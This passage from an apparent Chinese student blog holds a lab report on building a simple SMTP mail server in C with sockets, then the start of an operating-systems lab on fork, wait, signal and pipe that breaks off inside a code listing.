href="#算法流程" class="headerlink" title="算法流程"></a>算法流程</h2><p>画出流程图，描述算法的主要流程。</p><h3 id="整体算法流程"><a href="#整体算法流程" class="headerlink" title="整体算法流程"></a>整体算法流程</h3><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570457055794.png" alt="1570457055794"></p><h3 id="主函数NS盒图"><a href="#主函数NS盒图" class="headerlink" title="主函数NS盒图"></a>主函数NS盒图</h3><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570457068039.png" alt="1570457068039"></p><h3 id="Server函数NS盒图"><a href="#Server函数NS盒图" class="headerlink" title="Server函数NS盒图"></a>Server函数NS盒图</h3><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570457082800.png" alt="1570457082800"></p><h3 id="Client函数NS盒图"><a href="#Client函数NS盒图" class="headerlink" title="Client函数NS盒图"></a>Client函数NS盒图</h3><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570457090449.png" alt="1570457090449"></p><p>(备注：由于函数中使用了大量if语句，但是NS盒图很难画大量的if语句，故if语句用文字代替)</p><h2 id="主要功能模块的实现要点"><a href="#主要功能模块的实现要点" class="headerlink" title="主要功能模块的实现要点"></a>主要功能模块的实现要点</h2><ol><li><p><code>main()</code>——主函数</p><p>实现要点：先后调用服务器客户端函数并判断是否调用成功</p></li><li><p><code>int server()</code>——服务器函数</p><p>实现要点：通过socket进行服务器监听，客户端请求，连接确认三步客户端建立tcp连接，然后根据smtp的协议来进行通信，依次接收ehlo、auth login、用户名、密码、源邮箱地址、目的邮箱地址、邮件内容，获取邮件长度，最后关闭套接字释放资源。</p><p>其中使用了socket的常用函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket</span><span class="params">(<span class="keyword">int</span> domain, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol)</span>      <span class="comment">//创建套接字</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind</span><span class="params">(SOCKET socket, <span class="keyword">const</span> struct sockaddr* address, <span class="keyword">socklen_t</span> address_len)</span>  <span class="comment">//绑定套接字</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">recv</span><span class="params">(SOCKET socket, <span class="keyword">char</span> FAR* buf, <span class="keyword">int</span> len, <span class="keyword">int</span> flags)</span> <span class="comment">//接收信息</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">send</span> <span class="params">(SOCKET socket, <span class="keyword">char</span> FAR* buf, <span class="keyword">int</span> len, <span class="keyword">int</span> flags)</span><span class="comment">//发送信息</span></span></span><br></pre></td></tr></table></figure></li><li><p><code>int client()</code>——客户端函数</p><p>实现要点：首先建立连接，获取到真正的客户端邮件服务器地址，开始作为客户端与之通信，依次发送ehlo、auth login、用户名、密码、客户端目的邮箱名称、data、imf、邮件末尾点号，最后发送quit通信结束。</p><p>其中使用了socket的常用函数如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket</span><span class="params">(<span class="keyword">int</span> domain, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol)</span><span class="comment">//创建套接字</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">connect</span><span class="params">(SOCKET socket, <span class="keyword">const</span> struct sockaddr* address, <span class="keyword">socklen_t</span> address_len)</span><span class="comment">//绑定套接字</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">recv</span><span class="params">(SOCKET socket, <span class="keyword">char</span> FAR* buf, <span class="keyword">int</span> len, <span class="keyword">int</span> flags)</span> <span class="comment">//接收信息</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">send</span> <span class="params">(SOCKET socket, <span class="keyword">char</span> FAR* buf, <span class="keyword">int</span> len, <span class="keyword">int</span> flags)</span><span class="comment">//发送信息</span></span></span><br></pre></td></tr></table></figure></li><li><p><code>ValidEmail(char *)</code>——收发件邮箱地址合法性监测</p><p>实现要点：根据标准email地址格式进行合法性监测； </p></li></ol><h1 id="实验结果演示及分析"><a href="#实验结果演示及分析" class="headerlink" title="实验结果演示及分析"></a>实验结果演示及分析</h1><h2 id="实现功能测试截图"><a href="#实现功能测试截图" class="headerlink" title="实现功能测试截图"></a>实现功能测试截图</h2><p>对于所实现的功能，逐个进行测试，并将输出截图。</p><ol><li><p>因未实现ssl所以不勾画ssl端口</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570457582715.png" alt="1570457582715"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570457615784.png" alt="1570457615784"></p></li><li><p>将一封邮件发送给多个接收者，并且接收者属于不同的域</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570457659516.png" alt="1570457659516"></p><p>下图为程序输出截图</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570457668896.png" alt="1570457668896"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570457685949.png" alt="1570457685949"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570457697414.png" alt="1570457697414"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570457711773.png" alt="1570457711773"></p><p>下图为程序运行后保存下来的以时间戳命名的日志文档</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570457723898.png" alt="1570457723898"></p><p>日志文档内容如下</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570457747310.png" alt="1570457747310"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570457754007.png" alt="1570457754007"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570457762168.png" alt="1570457762168"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570457771324.png" alt="1570457771324"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570457776111.png" alt="1570457776111"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570457787256.png" alt="1570457787256"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570457792426.png" alt="1570457792426"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570457798935.png" alt="1570457798935"></p><p>目的邮箱2、3的发送日志和目的邮箱1相似，这里就不一一赘述，会把日志放在实验报告里面</p><p>用base64将邮件内容解码(解码网站：<a href="https://1024tools.com/base64)得到真实邮件内容" target="_blank" rel="noopener">https://1024tools.com/base64)得到真实邮件内容</a></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570458208569.png" alt="1570458208569"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570458220376.png" alt="1570458220376"></p><p>下图为来自不同域的邮箱收到的邮件</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570458252177.png" alt="1570458252177"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570458292381.png" alt="1570458292381"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570458299259.png" alt="1570458299259"></p></li><li><p>邮件发送错误生成错误报告</p><ol><li><p>发件人邮箱错误</p><p>由于foxmail不会出现发件邮箱错误，为此我们首先更改了一下代码，得到差错报告</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570458368163.png" alt="1570458368163"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570458374129.png" alt="1570458374129"></p><p>时间戳日志内容</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570458393735.png" alt="1570458393735"></p></li><li><p>收件人邮箱错误</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570458420577.png" alt="1570458420577"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570458428161.png" alt="1570458428161"></p><p>在时间戳日志中的内容为</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570458447126.png" alt="1570458447126"></p></li><li><p>接收<code>EHLO</code>错误</p><p>由于foxmail一般不会出现接收”EHLO“错误，为此我们首先更改了一下代码，得到差错报告</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570458522622.png" alt="1570458522622"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570458529130.png" alt="1570458529130"></p><p>时间戳日志内容</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570458536158.png" alt="1570458536158"></p></li><li><p>接收<code>AUTH LOGIN</code>错误</p><p>由于foxmail一般不会出现接收<code>AUTH LOGIN</code>错误，为此我们首先更改了一下代码，得到差错报告</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570458595554.png" alt="1570458595554"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570458601831.png" alt="1570458601831"></p><p>时间戳日志内容</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570458616613.png" alt="1570458616613"></p></li><li><p>接收<code>DATA</code>错误</p><p>由于foxmail一般不会出现接收<code>DATA</code>错误，为此我们首先更改了一下代码，得到差错报告</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570458665510.png" alt="1570458665510"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570458677278.png" alt="1570458677278"></p><p>时间戳日志内容</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570458682084.png" alt="1570458682084"></p></li><li><p>接收 <code>.</code> 错误</p><p>由于foxmail一般不会出现接收<code>.</code>错误，为此我们首先更改了一下代码，得到差错报告</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570458758374.png" alt="1570458758374"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570458782507.png" alt="1570458782507"></p><p>时间戳日志内容</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570458791157.png" alt="1570458791157"></p></li><li><p>根据观察，发现foxmail发送<code>QUIT</code>后会直接退出，没有验证<code>quit</code>的必要性，因此，没有<code>QUIT</code>错误报告</p></li></ol></li><li><p>本地服务器实现接收多个邮箱，即不固定用户名和密码，上述发送邮箱是QQ邮箱，接下来实现发送邮箱是163邮箱</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570458900597.png" alt="1570458900597"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570458906161.png" alt="1570458906161"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570458913048.png" alt="1570458913048"></p></li></ol><h2 id="差错处理"><a href="#差错处理" class="headerlink" title="差错处理"></a>差错处理</h2><p>提供了差错处理功能，具体内容如下</p><ol><li>客户端发送邮件时，如果本机邮箱服务器未接收到命令，则会返回以下错误差错报告(差错报告截图已经出现在上面的图片中)：<ol><li>未接收到 <code>EHLO——503 Can&#39;t receive EHLO\r\n</code></li><li>未接收到 <code>AUTH LOGIN——503 Can&#39;t receive AUTH LOGIN\r\n</code></li><li>未接收到 <code>DATA——503 Can&#39;t receive DATA\r\n</code></li><li>未接收到 <code>. ——503 Can&#39;t receive &#39; . &#39;\r\n</code></li></ol></li><li>在建立连接时如果出现错误会结束进程并且输出错误。</li><li>提供了Error函数来判断错误类型，并将其保存在日志文件中，如果在 socket 连接时出现问题则会返回错误代码并退出程序，方便进行调试。</li><li>程序中运用了大量的if-else语句来判断是否出错来。</li></ol><h2 id="与SMTP协议对比"><a href="#与SMTP协议对比" class="headerlink" title="与SMTP协议对比"></a>与SMTP协议对比</h2><ol><li><p>程序并未完全遵照课堂上学习的 smtp 协议实现通信过程。</p></li><li><p>不同之处</p><p>学习的smtp协议客户端发送EHLO后直接发送发件邮箱和目的邮箱，即客户端接收到的250状态码后面不包含AUTH LOGIN。而我们的程序接收到客户端发送的EHLO后，发送的250状态码中包含AUTH LOGIN，即要求客户端接着发送用户名和密码。这样我们的程序不会仅限于接收一个邮箱，可以接收多个邮箱，如既可以接收QQ邮箱，也可以接收网易邮箱、Gmail邮箱，即没有把用户名和密码固定。</p></li><li><p>优点</p><ol><li>在smtp协议基本功能实现的基础上，实现了差错报告，即用户可通过 POP3 协议登陆邮件服务器，从服务器上下载差错报告；</li><li>实现了检查邮箱地址是否合法；</li><li>支持多个收信人地址且所属域不同；</li><li>检查邮件发送过程中的多种错误；</li><li>可以根据发送客户端的邮箱格式，直接找出其真实客户端邮箱服务器的IP地址并与其进行连接，不用手动输入客户端邮箱服务器IP地址。 </li></ol></li><li><p>不足</p><ol><li>没有成功实现SSL安全加密；</li><li>如果与真实的客户端邮箱服务器连接发送邮件的过程中出现错误后无法将错误发送给客户端，只能打印在日志里，虽然正常情况下不会出现错误；</li><li>工作效率不如实际的服务器；</li><li>差错处理的过程中返回的状态码和内容不一定全面。</li></ol></li></ol><h1 id="实验总结和心得体会"><a href="#实验总结和心得体会" class="headerlink" title="实验总结和心得体会"></a>实验总结和心得体会</h1><ol><li><p>完成本次实验的实际上机调试时间是多少？ </p><p>本次实验的实际上机调试时间是10小时左右。</p></li><li><p>编程工具方面遇到了哪些问题？包括 Windows 环境和 VC 软件的安装问题。</p><ol><li>使用Dev-C++时要更改编译器配置在连接器命令行时加上以下命令<code>-static-libgcc -lwsock32</code> 。</li><li>由于SSL配置环境比较复杂，开始并未使用SSL安全加密，使用的是DEV-C++编写的程序，编写结束后，放到VS-2017环境下，出现了很多错误，多数是函数的名称的更改和函数变量数目的更改。</li><li>VS编译环境中SSL环境配置比较复杂，并且将原本的代码更改为SSL代码比较繁琐，这也是SSL未实现的原因。</li></ol></li><li><p>编程语言方面遇到了哪些问题？包括C语言使用和对C语言操控能力上的问题</p><ol><li>第一次使用C语言接触socket编程，在此过程中查找了大量的资料来使用socket的一些函数。</li><li>C语言在实现从文件读取数据时与写入数据时比较复杂，查找了一些资料。</li><li>时间戳函数是自己写的一个函数，没发现C语言有自己的时间戳库函数。</li><li>子函数的套用容易出现逻辑错误。</li><li>返回值刚开始并未实现统一，导致写主函数时出现了逻辑错误。</li></ol></li><li><p>协议方面遇到了哪些问题？</p><ol><li>客户端在发送邮件内容时，会将邮件内容拆分为<code>DATA fragment</code>,<code>...bytes</code>、<code>imf</code>和<code>.</code>，服务器端只判断最后的点号并且只在判断点号合法后才发送<code>250 OK</code> 。</li><li>服务器端发送的<code>250 Server ready</code>内容必须包含<code>AUTH LOGIN</code>，客户端才会发送用户名和密码。</li><li>服务器在返回状态码命令时，需要在状态码后面添加其他字符否则会出错，无法接收客户端的下一条 smtp 命令。</li></ol></li><li><p>通过本次试验，你认为 SMTP 协议有哪些不足？有何改进思路？ </p><ol><li><p>不足</p><p>smtp 协议缺少安全性，smtp 协议除了用户名与密码和邮件内容需要通过base64码转换，其他信息均是明文传输，并且base64转换也很容易破译，容易受到第三方的攻击，被第三方截取邮件内容，或是篡改收件人，发件人的地址以及邮件内容，十分容易受到中间人攻击或者重放的攻击行为。 </p></li><li><p>改进</p><p>可以将 smtp 发送的命令内容、邮件内容、地址都进行必要的加密。扩展改进等已有SSL，X2.5等增强版本存在。</p></li></ol></li><li><p>总结本次实验，你在 C 语言方面，协议软件方面，理论学习方面，软件工程方面等哪些方面上有所提高？ </p><ol><li>第一次使用C语言编写一千多行的程序，通过此次smtp邮箱服务器编程实验，我们再次加深对C语言的学习，比如文件的读取、socket的一些编程函数的调用、程序逻辑规范等等。</li><li>在协议软件方面，我们对smtp协议有了更深的理解，对一些命令，返回状态码都理解得更透彻，巩固了学习到的邮件服务器如何工作，用户如何利用邮件服务器发邮件，以及通过 socket 建立一个连接等方面的知识，同时利用wireshark进行抓包深刻体会到smtp的安全性有待提升。</li><li>理论学习方面，对C/S模型和邮件传输协议的理解更加明了。</li></ol></li></ol><p>附：<a href="https://github.com/Leeyuxun/Simple-mailbox-server/" target="_blank" rel="noopener">实验源码</a></p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SMPT </tag>
            
            <tag> 邮箱服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统内核-实验二</title>
      <link href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8-%E5%AE%9E%E9%AA%8C%E4%BA%8C.html"/>
      <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8-%E5%AE%9E%E9%AA%8C%E4%BA%8C.html</url>
      
        <content type="html"><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ol><li>加深对进程概念的理解，明确进程和程序的区别；                                                                     </li><li>进一步认识并发执行的实质；                                                                                       </li><li>分析进程争用资源的现象，学习解决进程互斥的方法； </li><li>了解Linux系统中进程通信的基本原理；<a id="more"></a></li></ol><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><h2 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h2><h3 id="fork函数"><a href="#fork函数" class="headerlink" title="fork函数"></a>fork函数</h3><ul><li><p>在Linux中，fork函数是非常重要的函数，它的作用是从已经存在的父进程中创建一个子进程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;//引用fork时的头文件</span></span></span><br><span class="line"><span class="keyword">pid_t</span>   fork(<span class="keyword">void</span>);<span class="comment">//fork的返回类型为空1</span></span><br></pre></td></tr></table></figure></li><li><p>当一个进程调用fork函数之后，就有两个二进制代码相同的进程，运行在相同的位置，但是每个进程都开始自己的活动。</p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570014004158.png"></li><li><p>调用fork函数，当控制转移到内核中的fork代码后，内核开始做如下工作：</p><ol><li>分配新的内存块和内核数据结构给子进程；</li><li>将父进程部分数据结构内容拷贝至子进程；</li><li>将子进程添加到系统进程列表；</li><li>fork返回开始调度器，调度。</li></ol></li><li><p>调用fork函数返回值的三种情况：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fork</span><span class="params">()</span></span>; </span><br><span class="line">pid = fork(); </span><br><span class="line"><span class="keyword">if</span>(pid &lt; <span class="number">0</span>) &#123;<span class="comment">//错误</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"fork error\n"</span>);                         </span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(pid == <span class="number">0</span>) &#123; <span class="comment">//子进程</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The child process is running now!\n"</span>); </span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(pid &gt; <span class="number">0</span>) &#123;<span class="comment">//父进程</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The parent process is running now!\n"</span>); </span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><code>pid &lt; 0</code>，运行错误；</li><li><code>pid &gt; 0</code>，运行父进程；</li><li><code>pid = 0</code>，运行子进程。</li></ol></li></ul><h3 id="wait函数"><a href="#wait函数" class="headerlink" title="wait函数"></a>wait函数</h3><ul><li><p>函数原型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;/*提供类型pid_t的定义*/</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wait.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wait</span><span class="params">(<span class="keyword">int</span> *status)</span></span></span><br></pre></td></tr></table></figure></li><li><p>函数功能：父进程一旦调用了wait函数就立即阻塞自己，由wait自动分析是否当前进程的某个子进程已经退出，如果让它找到了这样一个已经变成僵尸的子进程，wait就会收集这个子进程的信息，并把它彻底销毁后返回；如果没有找到这样一个子进程，wait就会一直阻塞在这里，直到有一个出现为止。</p></li><li><p>备注：</p><ul><li><p>当父进程忘了用wait函数等待已终止的子进程时，子进程就会进入一种无父进程的状态，此时子进程就是僵尸进程；</p></li><li><p>wait()要与fork()配套出现，如果在使用fork()之前调用wait()，wait()的返回值则为-1，正常情况下wait()的返回值为子进程的PID；</p></li><li><p>如果先终止父进程，子进程将继续正常进行，只是它将由init进程(PID 1)继承，当子进程终止时，init进程捕获这个状态；</p></li><li><p>参数status用来保存被收集进程退出时的一些状态，它是一个指向int类型的指针。但如果我们对这个子进程是如何死掉毫不在意，只想把这个僵尸进程消灭掉，我们就可以设定这个参数为NULL，就像下面这样：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pid = wait(<span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></li><li><p>如果成功，wait会返回被收集的子进程的进程ID，如果调用进程没有子进程，调用就会失败，此时wait返回-1，同时errno被置为ECHILD。</p></li><li><p>如果参数status的值不是NULL，wait就会把子进程退出时的状态取出并存入其中，<br>这是一个整数值（int），指出子进程是正常退出还是被非正常结束的，以及正常结束时的返回值，或被哪一个信号结束的等信息。由于这些信息被存放在一个整数的不同二进制位中，所以用常规的方法读取会非常麻烦，因此设计了一套专门的宏（macro）来完成这项工作，其中最常用的两个如下：</p><ol><li><p><code>WIFEXITED(status)</code><br>这个宏用来指出子进程是否为正常退出的，如果是，它会返回一个非零值。</p></li><li><p><code>WEXITSTATUS(status)</code> </p><p>当WIFEXITED返回非零值时，我们可以用这个宏来提取子进程的返回值，如果子进程调用exit(5)退出，WEXITSTATUS(status)就会返回5；如果子进程调用exit(7)，WEXITSTATUS(status)就会返回7。如果进程不是正常退出的，也就是说，<br>WIFEXITED返回0，这个值就毫无意义。</p></li></ol></li></ul></li></ul><h3 id="exit函数"><a href="#exit函数" class="headerlink" title="exit函数"></a>exit函数</h3><p>进程结束最常用函数，表示正常结束；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exit</span><span class="params">(<span class="keyword">int</span> status)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="kill函数"><a href="#kill函数" class="headerlink" title="kill函数"></a>kill函数</h3><p>删除执行中的程序和任务，异常结束；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill(<span class="keyword">int</span> PID,<span class="keyword">int</span> IID);</span><br></pre></td></tr></table></figure><h3 id="signal函数"><a href="#signal函数" class="headerlink" title="signal函数"></a>signal函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span>(* signal(<span class="keyword">int</span> sig, <span class="keyword">void</span>(* func)(<span class="keyword">int</span>)))(<span class="keyword">int</span>);</span><br></pre></td></tr></table></figure><ul><li><p>设置处理信号的功能指定使用sig指定的<em>信号编号</em>处理信号的方法。 参数func指定程序可以处理信号的三种方式之一：</p><ol><li>默认处理(SIG_DFL)：信号由该特定信号的默认动作处理；</li><li>忽略信号(SIG_IGN)：忽略信号，即使没有意义，代码执行仍将继续；</li><li>函数处理程序：定义一个特定的函数来处理信号</li></ol></li><li><p>参数</p><ul><li><p><code>SIG</code></p><p>设置处理功能的信号值；</p></li><li><p><code>FUNC</code></p><p>指向函数的指针；</p></li><li><p>返回值</p><p>返回类型与参数func的类型相同。</p></li></ul></li><li><p>常用的signal</p></li></ul><table><thead><tr><th>信号</th><th>功能</th><th>值</th></tr></thead><tbody><tr><td>SIGNHUP</td><td>挂起</td><td>1</td></tr><tr><td>SIGINT</td><td>键盘中断，键盘按<code>Ctrl+C</code></td><td>2</td></tr><tr><td>SIGQUIT</td><td>键盘按<code>QUIT</code></td><td>3</td></tr><tr><td>SIGILL</td><td>非法指令</td><td>4</td></tr><tr><td>SIGTRAP</td><td>跟踪中断</td><td>5</td></tr><tr><td>SIGIOT</td><td>IOT指令</td><td>6</td></tr><tr><td>SIGBUS</td><td>总线错</td><td>7</td></tr><tr><td>SIGFPE</td><td>浮点运算溢出</td><td>8</td></tr><tr><td>SIGKILL</td><td>要求终止进程</td><td>9</td></tr><tr><td>SIGUSR1</td><td>用户定义信号#1</td><td>10</td></tr><tr><td>SIGSEGV</td><td>段违法</td><td>11</td></tr><tr><td>SIGUSR2</td><td>用户定义信号#2</td><td>12</td></tr><tr><td>SIGPIPE</td><td>向没有读进程的管道上写</td><td>13</td></tr><tr><td>SIGALRM</td><td>定时器告警，时间到</td><td>14</td></tr><tr><td>SIGTERM</td><td>kill发出的软件结束信号</td><td>15</td></tr><tr><td>SIGSTKFLT</td><td>Linux专用，数学协处理器的栈异常</td><td>16</td></tr><tr><td>SIGCHLD</td><td>子进程死</td><td>17</td></tr><tr><td>SIGCOUNT</td><td>若已停止则继续</td><td>18</td></tr><tr><td>SIGPWR</td><td>电源故障</td><td>30</td></tr></tbody></table><h3 id="pipe函数"><a href="#pipe函数" class="headerlink" title="pipe函数"></a>pipe函数</h3><p>管道是一种把两个进程之间的标准输入和标准输出连接起来的机制，从而提供一种让多个进程间通信的方法，当进程创建管道时，每次都需要提供两个文件描述符来操作管道。其中一个对管道进行写操作，另一个对管道进行读操作。对管道的读写与一般的IO系统函数一致，使用write()函数写入数据，使用read()读出数据。</p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570038016574.png"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pipe</span><span class="params">(<span class="keyword">int</span> filedes[<span class="number">2</span>])</span></span>;</span><br></pre></td></tr></table></figure><p>返回值：成功，返回0，否则返回-1。</p><p>参数数组包含pipe使用的两个文件的描述符。</p><ul><li>fd[0]:读管道；</li><li>fd[1]:写管道；</li><li>fd[2]:提供进程使用的文件描述符数组。</li></ul><p>必须在fork()中调用pipe()，否则子进程不会继承文件描述符。两个进程不共享祖先进程，就不能使用pipe。</p><h2 id="编制实现软中断通信的程序"><a href="#编制实现软中断通信的程序" class="headerlink" title="编制实现软中断通信的程序"></a>编制实现软中断通信的程序</h2><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>使用系统调用fork()创建两个子进程，再用系统调用signal()让父进程捕捉键盘上来的中断信号（即按Ctrl+c键），当父进程接受到这两个软中断的其中某一个后，父进程用系统调用kill()向两个子进程分别发送整数值为16和17软中断信号，子进程获得对应软中断信号后，分别输出下列信息后终止：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Child <span class="built_in">process</span> <span class="number">1</span> is killed by parent !!</span><br><span class="line">Child <span class="built_in">process</span> <span class="number">2</span> is killed by parent !!</span><br></pre></td></tr></table></figure><p>父进程调用wait()函数等待两个子进程终止后，输出以下信息后终止：                                                         </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Parent <span class="built_in">process</span> is killed!!</span><br></pre></td></tr></table></figure><h3 id="程序流程图"><a href="#程序流程图" class="headerlink" title="程序流程图"></a>程序流程图</h3><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570080291071.png" width="75%" height="75%"><h3 id="程序源代码"><a href="#程序源代码" class="headerlink" title="程序源代码"></a>程序源代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 